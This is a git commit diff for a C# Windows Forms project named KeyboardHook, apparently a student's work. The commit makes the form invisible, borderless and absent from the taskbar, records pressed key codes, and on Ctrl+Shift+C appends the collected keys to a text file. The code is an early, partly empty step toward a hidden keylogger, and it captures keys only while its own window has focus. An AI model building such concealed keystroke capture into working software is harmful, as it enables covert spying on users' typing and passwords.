5fe1e7cb04cfdeeb9fc9a827603ec7b2778853ab
ZONICA LOMBARD <26995662@student365.msfed.nwu.ac.za>
2019-05-16 12:00:38 +0200

    Transparent

--- KeyboardHook/Form1.Designer.cs
+++ KeyboardHook/Form1.Designer.cs
@@ -28,43 +28,26 @@
         /// </summary>
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
-            this.timer1 = new System.Windows.Forms.Timer(this.components);
-            this.label1 = new System.Windows.Forms.Label();
             this.SuspendLayout();
-            // 
-            // timer1
-            // 
-            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
-            // 
-            // label1
-            // 
-            this.label1.AutoSize = true;
-            this.label1.Location = new System.Drawing.Point(71, 44);
-            this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(46, 17);
-            this.label1.TabIndex = 0;
-            this.label1.Text = "label1";
             // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(1078, 540);
-            this.Controls.Add(this.label1);
+            this.ClientSize = new System.Drawing.Size(698, 473);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
             this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "Form1";
+            this.TransparencyKey = System.Drawing.SystemColors.Control;
+            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
             this.Load += new System.EventHandler(this.Form1_Load);
             this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyDown);
             this.ResumeLayout(false);
-            this.PerformLayout();
 
         }
 
         #endregion
-
-        private System.Windows.Forms.Timer timer1;
-        private System.Windows.Forms.Label label1;
     }
 }
 
--- KeyboardHook/Form1.cs
+++ KeyboardHook/Form1.cs
@@ -7,11 +7,15 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows.Input;
+using System.Threading;
+using System.IO;
 
 namespace KeyboardHook
 {
     public partial class Form1 : Form
     {
+
         private string hook = "";
         private int counter = 0; //state of keyboardhook 0 = paused 1 =running
 
@@ -20,6 +24,12 @@ namespace KeyboardHook
             InitializeComponent();
 
 
+            //not show in taskbar
+            this.ShowInTaskbar = false;
+
+            this.Visible = false;
+
+            this.Hide();
         }
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -36,20 +46,58 @@ namespace KeyboardHook
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            Thread t = new Thread(Keyboard);
+            t.Start();
+        }
+
+        public void Keyboard() {
+
+          
+
+
+
 
         }
 
+
         private void Form1_KeyDown(object sender, KeyEventArgs e)
         {
-            //Keyboard hook Zonica
-            hook += e.KeyCode.ToString(); //capture keycode that was pressed
-            label1.Text = String.Empty;
-            label1.Text += hook;
 
+           
+               
+                //Keyboard hook Zonica
+                hook += e.KeyCode.ToString(); //capture keycode that was pressed
+               
 
+            
 
+            if (e.Control && e.Shift && e.KeyCode.ToString() == "C")
+            {
+               
+                    MessageBox.Show(hook);
+                    counter--;
+                    String path = @".\abc.txt";
 
+                    using (StreamWriter sr = File.AppendText(path))
+                    {
+                        sr.WriteLine(hook + "\r\n");
+                        sr.Close();
+                    }
+            }
+        }
 
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+
+        }
+
+        private void timer1_Tick_1(object sender, EventArgs e)
+        {
+      
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
         }
     }
 }
